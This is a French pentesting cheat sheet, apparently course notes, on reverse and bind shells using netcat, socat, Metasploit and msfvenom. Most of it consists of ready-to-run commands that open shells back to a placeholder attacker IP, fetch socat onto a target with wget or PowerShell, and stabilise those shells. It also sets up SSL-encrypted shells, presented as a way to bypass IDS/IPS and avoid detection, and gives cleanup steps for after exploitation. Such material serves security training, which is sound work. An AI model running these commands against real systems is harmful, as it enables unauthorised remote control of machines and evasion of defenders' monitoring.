
# 🐚 Reverse & Bind Shell Tools - Cheat Sheet

## 🔧 Netcat (nc) - "Swiss Army Knife" de réseau

### 🔹 Reverse Shell
```bash
# Attacker (écoute)
nc -lvnp 4444

# Victime (initie la connexion)
nc <attacker_ip> 4444 -e /bin/bash
```

### 🔹 Bind Shell
```bash
# Victime (écoute)
nc -lvnp 4444 -e /bin/bash

# Attacker (se connecte)
nc <target_ip> 4444
```

📌 **Inconvénient :** Shells instables par défaut  
📌 **+ d’options :** Peut aussi servir au banner grabbing, scan de port, transfert de fichiers...

---

## ⚙️ Socat - Netcat amélioré

### 🔹 Reverse Shell
```bash
# Attacker (écoute)
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Victime (initie la connexion)
socat TCP:<attacker_ip>:4444 EXEC:/bin/bash
```

📌 Shells généralement **plus stables** que Netcat  
⚠️ **Syntaxe plus complexe**  
⚠️ **Pas installé par défaut** sur la plupart des systèmes

---

## 🧰 Metasploit - multi/handler

### 🔹 Utilisation avec reverse shell
```bash
msfconsole

use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
run
```

📌 Permet d’**interagir avec un Meterpreter**  
📌 Gère très bien les payloads **staged**  
📌 Plus stable et personnalisable que Netcat ou Socat

---

## 🛠️ Msfvenom - Générateur de payloads

### 🔹 Exemple : payload reverse shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf > shell.elf
```

📌 Génère des payloads **reverse/bind**, mais aussi d’autres  
📌 **Standalone**, bien que partie du framework Metasploit

---

## 📚 Ressources externes

- 🔗 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- 🔗 [PentestMonkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- 📂 `/usr/share/webshells` (Kali Linux)
- 🔗 [SecLists](https://github.com/danielmiessler/SecLists) – contient aussi des scripts utiles pour shells



# 🧬 Reverse vs Bind Shells - Cheat Sheet

## 🔄 Reverse Shell

📌 **Le plus courant**, surtout en CTF  
📌 Le **cible** initie la connexion vers l'attaquant  
📌 Permet de **contourner les firewalls** côté cible  
⚠️ Peut nécessiter de **configurer son réseau** (hors TryHackMe)

### 🔹 Exemple (Linux)
```bash
# Attaquant (listener)
sudo nc -lvnp 443

# Cible (initie la connexion)
nc <attacker_ip> 443 -e /bin/bash
```

🎯 Objectif : exécution de commandes sur la machine cible depuis notre terminal

---

## 📡 Bind Shell

📌 **Moins courant**, mais utile dans certains cas  
📌 La **cible écoute** sur un port, l’attaquant s’y connecte  
📌 Aucun réglage réseau requis côté attaquant  
⚠️ Peut être **bloqué par les firewalls** côté cible

### 🔹 Exemple (Windows)
```bash
# Cible (listener)
nc -lvnp <port> -e "cmd.exe"

# Attaquant (connexion)
nc <target_ip> <port>
```

🎯 Objectif : l’attaquant se connecte à un shell exposé par la cible

---

## 🧑‍💻 Interactivité des Shells

### 🔹 Interactive Shell
✅ Permet les prompts utilisateurs (ex : `ssh`, `passwd`)  
✅ Navigation et interaction normales  
💡 Nécessite un terminal interactif

### 🔹 Non-Interactive Shell
🚫 Pas de gestion de prompts  
✅ Commandes simples (ex : `whoami`) OK  
⚠️ Commandes interactives comme `ssh` ne fonctionnent pas

---

## 🧠 Bonus : Alias `listener`

Dans les captures d’écran, le mot `listener` est un alias local équivalent à :
```bash
sudo rlwrap nc -lvnp 443
```

📌 `rlwrap` améliore l’expérience avec l’historique et l’interactivité  
⚠️ Ce raccourci **n’est pas universel** : il doit être configuré manuellement

# 🧪 Netcat - Reverse & Bind Shells Cheat Sheet

## 🧰 Lancement d’un Listener Netcat (Reverse Shell)

```bash
nc -lvnp <port>
```

🔹 `-l` : Mode écoute (listener)  
🔹 `-v` : Mode verbeux  
🔹 `-n` : Pas de résolution DNS  
🔹 `-p` : Spécifie le port

📌 **Exemple :**
```bash
sudo nc -lvnp 443
```

✅ Utiliser `sudo` si le port est < 1024  
✅ Ports communs pour évasion firewall : `80`, `443`, `53`

---

## 🔄 Connexion à un Listener Netcat (Bind Shell)

```bash
nc <target_ip> <port>
```

🎯 Utilisé pour se connecter à une cible qui écoute déjà sur un port (bind shell)  
📌 Ne nécessite **aucun paramètre supplémentaire**

---

## 💡 Résumé

| Type de Shell   | Cible initie ? | Attaquant initie ? | Netcat utilisé pour...      |
|-----------------|----------------|---------------------|------------------------------|
| Reverse Shell   | ✅ Oui          | ❌ Non              | 🔊 Attendre la connexion     |
| Bind Shell      | ❌ Non         | ✅ Oui              | 🔗 Se connecter au listener  |


# 🧷 Stabiliser un Shell Netcat - Cheat Sheet

Les shells Netcat sont **non interactifs** et instables. Voici 3 techniques efficaces pour les stabiliser sur Linux.

---

## 🧪 Technique 1 : Python (Linux uniquement)

1. **Spawning d’un shell interactif**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# ou
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

2. **Définir le type de terminal**
```bash
export TERM=xterm
```

3. **Restaurer l’interactivité**
```bash
# Ctrl + Z pour mettre le shell en arrière-plan
stty raw -echo
fg
```

💡 Pour corriger un terminal "cassé", tapez `reset`.

---

## 🧰 Technique 2 : rlwrap (Linux + Windows)

🔧 Installation :
```bash
sudo apt install rlwrap
```

🎯 Lancer le listener :
```bash
rlwrap nc -lvnp <port>
```

🔁 Pour Linux : ajouter `stty raw -echo; fg` comme en Technique 1 pour une interactivité complète

✅ Fonctionne aussi avec les shells Windows (sans echo Ctrl+C)

---

## 🔄 Technique 3 : Migration vers Socat (Linux uniquement)

1. **Lancer un serveur HTTP sur l’attaquant** :
```bash
sudo python3 -m http.server 80
```

2. **Télécharger `socat` sur la cible** :
```bash
# Linux
wget http://<LOCAL-IP>/socat -O /tmp/socat

# Windows PowerShell
Invoke-WebRequest -Uri http://<LOCAL-IP>/socat.exe -OutFile C:\Windows\Temp\socat.exe
```

📦 Utiliser un binaire **statiquement compilé**

➡️ On verra plus tard comment l'utiliser pour établir un shell plus stable.

---

## 🖥️ Ajuster la taille du terminal

1. **Obtenir dimensions de ton terminal** (depuis un 2e terminal) :
```bash
stty -a
```

2. **Appliquer dans le shell instable** :
```bash
stty rows <valeur> 
stty cols <valeur>
```

✅ Nécessaire pour bien afficher des éditeurs comme `nano`, `vim`, etc.

---
```bash
# Résumé rapide :
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```
# 🔌 Socat Reverse & Bind Shells - Cheat Sheet

**Socat** = netcat ++  
Un outil puissant pour établir des connexions stables, interactives et TTY-friendly.

---

## 🔁 Reverse Shells avec Socat

### 🎧 Listener (Attaquant) :
```bash
socat TCP-L:<port> -
```

### 📤 Cible Linux :
```bash
socat TCP:<attacker-ip>:<port> EXEC:"bash -li"
```

### 📤 Cible Windows :
```bash
socat TCP:<attacker-ip>:<port> EXEC:powershell.exe,pipes
```

---

## 🔗 Bind Shells avec Socat

### 🎧 Listener Windows :
```bash
socat TCP-L:<port> EXEC:powershell.exe,pipes
```

### 🎧 Listener Linux :
```bash
socat TCP-L:<port> EXEC:"bash -li"
```

### 💻 Connexion (Attaquant) :
```bash
socat TCP:<target-ip>:<port> -
```

---

## 💡 Shell Linux Full TTY (Stabilisé)

### ✅ Étapes :

#### 🎧 Listener spécial (Attaquant) :
```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

#### 📤 Commande spéciale (Cible Linux) :
```bash
socat TCP:<attacker-ip>:<port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

### 🧩 Détails des options :

- `pty` : alloue un pseudo-terminal
- `stderr` : permet l'affichage des erreurs
- `sigint` : accepte les Ctrl+C
- `setsid` : crée un nouveau session group
- `sane` : restaure un terminal "propre"

---

## 📦 Upload de Socat (si non présent sur la cible)

### 🖥️ Sur la machine d’attaque :
```bash
sudo python3 -m http.server 80
```

### 📥 Sur la cible :
```bash
# Linux
wget http://<attacker-ip>/socat -O /tmp/socat
chmod +x /tmp/socat

# Windows (PowerShell)
Invoke-WebRequest -Uri http://<attacker-ip>/socat.exe -OutFile C:\Windows\Temp\socat.exe
```

---

## 📏 Ajuster dimensions du terminal

```bash
# Depuis un terminal local
stty -a  # puis repérez rows et cols

# Depuis le shell distant
stty rows <valeur>
stty cols <valeur>
```

---

## 🐞 Debug Socat

Ajoutez `-d -d` pour plus de verbosité :
```bash
socat -d -d TCP-L:<port> FILE:`tty`,raw,echo=0
```
---

# 🔧 Astuces Socat Supplémentaires

## 🧪 Socat avec chiffrement (SSL)

Chiffrer les communications avec OpenSSL pour éviter une détection facile.

### 🎧 Listener chiffré :
```bash
socat OPENSSL-LISTEN:<port>,cert=cert.pem,key=key.pem,verify=0 FILE:`tty`,raw,echo=0
```

### 📤 Reverse shell chiffré :
```bash
socat OPENSSL:<attacker-ip>:<port>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

⚠️ Nécessite un certificat SSL (`cert.pem`) et clé (`key.pem`) générés sur l'attaquant.

---

## 🧹 Nettoyage après l’exploitation

Une fois que vous avez terminé, **supprimez Socat de la cible** :

```bash
rm /tmp/socat
```

Ou, sur Windows :

```powershell
Remove-Item C:\Windows\Temp\socat.exe
```

---

## 🔁 Comparaison Netcat vs Socat

| Fonction                  | Netcat            | Socat                            |
|---------------------------|-------------------|----------------------------------|
| Shells interactifs        | ❌ (non-TTY)       | ✅ (avec `pty`)                  |
| Chiffrement               | ❌                 | ✅ (via OpenSSL)                 |
| Multi-protocole           | ❌ (TCP/UDP)       | ✅ (TCP, UDP, SSL, etc.)         |
| Facilité de syntaxe       | ✅ (simple)        | ❌ (plus verbeux)                |
| Disponibilité système     | ✅ (souvent dispo) | ❌ (rarement préinstallé)        |
| Windows compatibility     | ✅ (basique)       | ✅ (avec version .exe adaptée)   |

---

## 📚 Références utiles

- [PayloadsAllTheThings - Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet)
- [PentestMonkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- Kali Linux Web Shells: `/usr/share/webshells/`
- Socat Binary Precompiled: [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

---

✅ **TL;DR : Socat = Shell TTY propre, flexible, multi-protocole.**  
📦 **Uploade-le sur la cible si pas présent.**  
🔐 **Ajoute SSL pour éviter détection réseau.**


# 🛡️ Socat Encrypted Shells Cheat Sheet

## 🎯 Pourquoi chiffrer une shell ?
- Permet de **bypasser les IDS/IPS**.
- Le trafic est **chiffré**, donc difficile à inspecter sans la clé.
- Fonctionne pour **reverse** et **bind shells**.

---

## 🔐 Générer un certificat auto-signé
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```

---

## 🔁 Reverse Shell Chiffrée

### 🎧 Listener (Attaquant)
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```

### 📡 Target (Shell)
```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

---

## 🔁 Reverse Shell Chiffrée (avec TTY)

### 🎧 Listener (Attaquant)
```bash
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```

### 📡 Target
```bash
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

---

## 🔁 Bind Shell Chiffrée

### 🎧 Listener (Target)
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

### 📡 Client (Attaquant)
```bash
socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -
```

---

## 🧠 Remarques
- Le **certificat doit être utilisé par l'écouteur** (listener).
- Pour bind shell, la **machine cible** doit contenir le fichier `.pem`.
- Compatible **Linux & Windows**, mais stabilité meilleure sous Linux.




